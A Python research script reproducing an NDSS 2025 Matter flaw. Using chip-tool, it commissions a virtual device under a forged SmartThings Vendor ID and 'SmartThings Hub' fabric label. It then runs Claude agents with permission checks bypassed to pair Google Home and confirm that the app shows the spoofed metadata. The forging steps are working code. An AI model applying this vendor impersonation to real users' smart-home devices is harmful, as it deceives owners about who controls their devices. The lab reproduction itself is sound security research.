#!/usr/bin/env python3
"""
UMCCI Checker Demo — Flaw Type 4
Untrusted Fabric Information: forged Vendor ID and Label in Google Home.

Based on: "Hidden and Lost Control: on Security Design Risks in
           IoT User-Facing Matter Controller" (NDSS 2025)

Target:    Google Home app + matter.js virtual OnOff device
Agent:     Claude Code SDK (claude_agent_sdk)
GUI:       mobile-mcp (Android automation via ADB)
"""

import asyncio
import re
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

from claude_agent_sdk import query, ClaudeAgentOptions, AssistantMessage, ResultMessage
from claude_agent_sdk.types import TextBlock

# ── Paths ────────────────────────────────────────────────────────────────────
CHIP_TOOL    = "/Users/haoyuli9/Desktop/IoT-Matter/connectedhomeip/out/host/chip-tool"
MATTER_DIR   = str(Path(__file__).parent / "matter-device")
STORAGE_PATH = str(Path(__file__).parent / "storage" / "virtual-device")
MATTER_PORT  = 5542

# ── Flaw Type 4 test parameters ──────────────────────────────────────────────
ATTACKER_NODE_ID = 2          # chip-tool's local node-ID for the virtual device
FORGED_VENDOR_ID = 4362       # SmartThings VID (confirmed in NDSS 2025 paper Table II)
FORGED_LABEL     = "SmartThings Hub"
DEVICE_PASSCODE  = 20202021
DEVICE_DISC      = 3840

# chip-tool keeps fabric credentials in a KVS directory; use a per-run temp dir
# so it never conflicts with stale data from a previous run.
_chip_storage: str = ""

# ─────────────────────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    print(f"[UMCCI] {msg}", flush=True)


# ── Step 0: Environment check ─────────────────────────────────────────────────

def check_environment() -> None:
    log("=== Environment Check ===")

    result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
    live = [l for l in result.stdout.strip().splitlines()[1:]
            if l.strip() and "offline" not in l]
    if not live:
        sys.exit("ERROR: No Android device detected via ADB. Connect the phone first.")
    log(f"✓ Android device: {live[0].split()[0]}")

    if not Path(CHIP_TOOL).exists():
        sys.exit(f"ERROR: chip-tool not found at {CHIP_TOOL}")
    log("✓ chip-tool found")

    if not (Path(MATTER_DIR) / "dist" / "DeviceNode.js").exists():
        sys.exit(
            f"ERROR: matter-device not built — run 'npm install && npm run build' "
            f"inside {MATTER_DIR}/"
        )
    log("✓ matter-device built and ready")

    log("Environment check passed.\n")


# ── Step 1: matter.js virtual device ─────────────────────────────────────────

def is_already_commissioned() -> bool:
    """Detect prior commissioning by checking whether storage has data."""
    storage = Path(STORAGE_PATH)
    return storage.exists() and any(storage.rglob("*.json"))


def start_matter_device() -> tuple[subprocess.Popen, str | None]:
    """
    Launch the matter.js virtual OnOff device.
    Returns (proc, pairing_code).  pairing_code is None when already commissioned.
    """
    log("=== Starting Virtual Matter Device ===")
    Path(STORAGE_PATH).mkdir(parents=True, exist_ok=True)

    proc = subprocess.Popen(
        ["npm", "run", "app", "--",
         f"--port={MATTER_PORT}",
         f"--storage-path={STORAGE_PATH}"],
        cwd=MATTER_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    pairing_code: str | None = None
    ready = threading.Event()

    def _reader() -> None:
        nonlocal pairing_code
        assert proc.stdout is not None
        for raw in proc.stdout:
            line = raw.rstrip()
            print(f"  [matter.js] {line}")
            m = re.search(r"manual pairing code:\s*([\d-]+)", line, re.IGNORECASE)
            if m:
                pairing_code = m.group(1).replace("-", "")
                ready.set()
            if any(kw in line.lower() for kw in
                   ["uncommissioned", "commissioned", "server listening", "node started"]):
                ready.set()

    threading.Thread(target=_reader, daemon=True).start()
    ready.wait(timeout=40)
    time.sleep(2)  # allow mDNS advertisement to propagate

    if pairing_code:
        log(f"✓ Pairing code: {pairing_code}")
    else:
        log("Device started (already commissioned — no fresh pairing code).")
    return proc, pairing_code


# ── Step 2/3: chip-tool helpers ───────────────────────────────────────────────

def run_chip_tool(*args, timeout: int = 120) -> tuple[int, str]:
    # --storage-directory must come AFTER the subcommand positional args
    cmd = [CHIP_TOOL] + [str(a) for a in args] + ["--storage-directory", _chip_storage]
    log(f"  chip-tool {' '.join(str(a) for a in args)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    combined = r.stdout + r.stderr
    if r.returncode != 0:
        log(f"  [chip-tool rc={r.returncode}] {r.stderr[:300]}")
    return r.returncode, combined


def chip_tool_pair_forged() -> None:
    """
    Pair the virtual device using chip-tool with a forged Vendor ID.
    Uses onnetwork-long (passcode + discriminator) — no pairing code needed.
    chip-tool may report a CASE timeout after commissioning completes; we
    treat rc != 0 as a warning rather than an error because matter.js confirms
    commissioning success in its own log.
    """
    log(f"=== Flaw Type 4: chip-tool pairs with forged VID={FORGED_VENDOR_ID} ===")
    rc, out = run_chip_tool(
        "pairing", "onnetwork-long",
        ATTACKER_NODE_ID, DEVICE_PASSCODE, DEVICE_DISC,
        "--commissioner-vendor-id", FORGED_VENDOR_ID,
        timeout=180,
    )
    if "commissioning complete" in out.lower() or "completed with success" in out.lower():
        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")
    elif rc != 0:
        # chip-tool sometimes exits non-zero after a CASE timeout even when
        # commissioning itself succeeded.  Log but continue; the label write
        # below will fail fast if the fabric was not actually created.
        log(f"Warning: chip-tool exited rc={rc}; continuing (commissioning may still have succeeded)")
    else:
        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")


def chip_tool_set_label(label: str) -> None:
    """Set the forged fabric label on the device via OperationalCredentials cluster."""
    log(f"Setting forged fabric label: '{label}'")
    rc, _ = run_chip_tool(
        "operationalcredentials", "update-fabric-label",
        label, ATTACKER_NODE_ID, 0,
        timeout=60,
    )
    if rc == 0:
        log(f"✓ Fabric label set to '{label}'")
    else:
        log(f"Warning: update-fabric-label rc={rc}; continuing anyway")


def chip_tool_open_commissioning_window() -> str | None:
    """
    Open an Enhanced Commissioning Window so Google Home can join as a second fabric.
    Returns the new manual pairing code, or None on failure.
    """
    log("Opening commissioning window for Google Home (ECM)...")
    rc, out = run_chip_tool(
        "pairing", "open-commissioning-window",
        ATTACKER_NODE_ID,
        "1",     # ECM
        "300",   # window timeout (seconds)
        "1000",  # PBKDF iterations
        "3840",  # discriminator
        timeout=60,
    )
    m = re.search(r"Manual pairing code:\s*\[?([\d-]+)\]?", out, re.IGNORECASE)
    if m:
        code = m.group(1).replace("-", "")
        log(f"✓ Commissioning window open — Google Home pairing code: {code}")
        return code
    log(f"Warning: could not extract pairing code (rc={rc})")
    return None


# ── Step 4/5: Claude agent tasks ──────────────────────────────────────────────

async def run_agent(prompt: str, task_name: str) -> str:
    """
    Run a Claude agent task using the user's Claude Code settings,
    which include the mobile-mcp MCP server for Android GUI automation.
    """
    log(f"=== Agent Task: {task_name} ===")
    opts = ClaudeAgentOptions(
        permission_mode="bypassPermissions",
        setting_sources=["user"],   # inherit mobile-mcp from ~/.claude/settings.json
        max_turns=50,
    )
    parts: list[str] = []
    async for msg in query(prompt=prompt, options=opts):
        if isinstance(msg, AssistantMessage):
            for block in msg.content:
                if isinstance(block, TextBlock) and block.text.strip():
                    preview = block.text[:300].replace("\n", " ")
                    print(f"  [agent] {preview}")
                    parts.append(block.text)
        elif isinstance(msg, ResultMessage):
            cost = f"${msg.total_cost_usd:.4f}" if msg.total_cost_usd else "N/A"
            log(f"Agent task complete (cost: {cost})")
    return "\n".join(parts)


_PAIR_PROMPT = """\
You are a security researcher running an authorized IoT security test in a lab environment.

TASK: Pair Google Home with a virtual Matter device using the pairing code below.

Pairing code: {pairing_code}

Instructions:
1. Take a screenshot to see the current phone screen state.
2. Open Google Home app (package: com.google.android.apps.chromecast.app). If already open, proceed.
3. Add a new device:
   - Tap the "+" / "Add" button (bottom-right or top-right corner).
   - Choose "Set up device" → "New device" (or "Matter-enabled device").
   - When asked to scan a QR code, look for a "Setup without QR code" or "Enter code manually" option.
   - Enter pairing code: {pairing_code}
4. If prompted with "Uncertified device" or "Device not certified by Google", tap "Set up anyway" / "Add anyway".
5. Complete the setup wizard — accept defaults for room assignment and device name.
6. Confirm the device now appears in the Google Home device list.

If the device is already paired (you can see "UMCCI OnOff Light" or similar in Google Home), report success and skip.

Report what you observe at each key step and whether pairing succeeded."""

_VERIFY_PROMPT = """\
You are a security researcher verifying Matter IoT Flaw Type 4: untrusted fabric information.

Background: An attacker has paired this device using a forged Vendor ID ({forged_vid}) and \
label "{forged_label}". The question is whether Google Home displays this forged information.

TASK: In Google Home, navigate to the "Linked Matter apps & services" page for the paired \
virtual Matter device ("Jet Bedroom device" / "UMCCI OnOff Light") and screenshot the fabric list.

Navigation path (confirmed working):
1. Take a screenshot to see the current screen.
2. Open Google Home app (package: com.google.android.apps.chromecast.app).
3. On the Home tab, switch to "All devices" view (grid icon in the tab bar).
4. LONG-PRESS the "Jet Bedroom lights" group tile — this opens the group detail page showing \
   individual devices: "Jet Bedroom device", "Simple device", "Smart Light".
5. LONG-PRESS the "Jet Bedroom device" tile — this opens the device control page with a \
   gear icon (⚙️) in the top-right.
6. Tap the gear icon (⚙️) labelled "Settings" to open device settings.
7. Tap "Linked Matter apps & services" (subtitle: "Can control and manage this device").
8. Take a screenshot of the resulting page — it shows all Matter fabrics linked to this device, \
   each with a Vendor ID and display label.
9. Report the EXACT text of every entry listed, including Vendor ID values and labels.

Goal: Confirm that the forged fabric entry (Vendor ID={forged_vid} = 0x{forged_vid:04X}, \
label="{forged_label}") appears in the "Linked Matter apps & services" list, \
demonstrating that Google Home displays attacker-controlled fabric metadata without verification."""


# ── Main orchestration ────────────────────────────────────────────────────────

async def main() -> None:
    global _chip_storage

    print()
    print("=" * 60)
    print(" UMCCI Checker Demo — Flaw Type 4")
    print(" Untrusted Fabric Information (VID & Label Forgery)")
    print("=" * 60)
    print()

    # ── 0. Environment ─────────────────────────────────────────────────────────
    check_environment()

    # ── chip-tool KVS: fresh per-run temp directory ────────────────────────────
    _chip_storage = tempfile.mkdtemp(prefix="chip-kvs-")
    log(f"chip-tool storage: {_chip_storage}")

    # ── 1. Start virtual device ────────────────────────────────────────────────
    already_commissioned = is_already_commissioned()
    proc, pairing_code = start_matter_device()

    try:
        if not already_commissioned:
            # ── 2. Fresh device: attack + pairing flow ─────────────────────────
            if pairing_code is None:
                raise RuntimeError(
                    "Fresh storage but no pairing code captured. "
                    "Delete the storage/ directory and rerun."
                )

            # Attacker pairs first with forged VID
            chip_tool_pair_forged()
            chip_tool_set_label(FORGED_LABEL)

            # Open commissioning window → Google Home pairs as second fabric
            new_code = chip_tool_open_commissioning_window()
            if new_code is None:
                raise RuntimeError("Failed to open commissioning window for Google Home.")

            # Agent: pair Google Home
            await run_agent(
                _PAIR_PROMPT.format(pairing_code=new_code),
                "Pair Google Home with virtual device",
            )

        else:
            # ── 2b. Already commissioned: go straight to verification ───────────
            log("Storage already exists — skipping pairing phase.")
            log("Forged fabric from previous run is still present on the device.\n")

        # ── 3. Give Google Home time to sync ──────────────────────────────────
        log("Waiting for Google Home to sync fabric data...")
        time.sleep(8)

        # ── 4. Agent: verify forged fabric info in Google Home UI ──────────────
        result = await run_agent(
            _VERIFY_PROMPT.format(
                forged_vid=FORGED_VENDOR_ID,
                forged_label=FORGED_LABEL,
            ),
            "Verify forged fabric info in Google Home",
        )

        # ── 5. Report ──────────────────────────────────────────────────────────
        print()
        print("=" * 60)
        print(" FLAW TYPE 4 — TEST REPORT")
        print("=" * 60)
        print(f"  Forged Vendor ID : {FORGED_VENDOR_ID}  (impersonating SmartThings)")
        print(f"  Forged Label     : {FORGED_LABEL}")
        print()
        print("Verification findings (from agent):")
        print("-" * 40)
        print(result)
        print("=" * 60)

    finally:
        log("Stopping virtual Matter device...")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    asyncio.run(main())
